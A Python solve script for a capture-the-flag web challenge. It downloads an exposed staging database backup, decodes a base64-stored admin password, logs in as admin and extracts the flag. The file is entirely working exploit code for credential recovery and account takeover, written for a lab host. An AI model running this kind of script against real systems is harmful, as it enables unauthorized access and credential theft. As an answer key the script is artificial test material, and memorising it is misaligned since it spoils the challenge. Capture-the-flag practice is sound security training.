#!/usr/bin/env python3
"""
Cornerstone CMS (auth, 100) — CWE-257/CWE-522, reversible password in an exposed backup.

A listable /export/ directory serves a staging DB backup whose admin row stores
the password as base64 (recoverable, not hashed). Fetch the backup, decode the
password, log in as admin.

Usage:
    python3 solve.py                          # defaults to auth12.chal.deti:8071
    python3 solve.py http://auth12.chal.deti:8071
"""
import base64
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://auth12.chal.deti:8071"
BACKUP = f"{BASE}/export/cornerstone_staging.sql.bak"
LOGIN = f"{BASE}/login"

ROW_RE = re.compile(r"\('(?P<user>[^']+)',\s*'(?P<pw>[^']+)'\)")
FLAG_RE = re.compile(r"flag\{[^}]*\}")


def main() -> int:
    sql = requests.get(BACKUP, timeout=10).text
    m = ROW_RE.search(sql)
    if not m:
        print("[-] could not find a user row in the backup")
        return 1
    user, enc = m.group("user"), m.group("pw")
    password = base64.b64decode(enc).decode("latin-1")
    print(f"[+] recovered {user} : {enc!r} -> {password!r}")

    r = requests.post(LOGIN, data={"username": user, "password": password}, timeout=10)
    flag = FLAG_RE.search(r.text)
    if flag:
        print(f"[+] FLAG: {flag.group(0)}")
        return 0
    print("[!] logged in but no flag on the response — dumping head:\n")
    print(r.text[:2000])
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
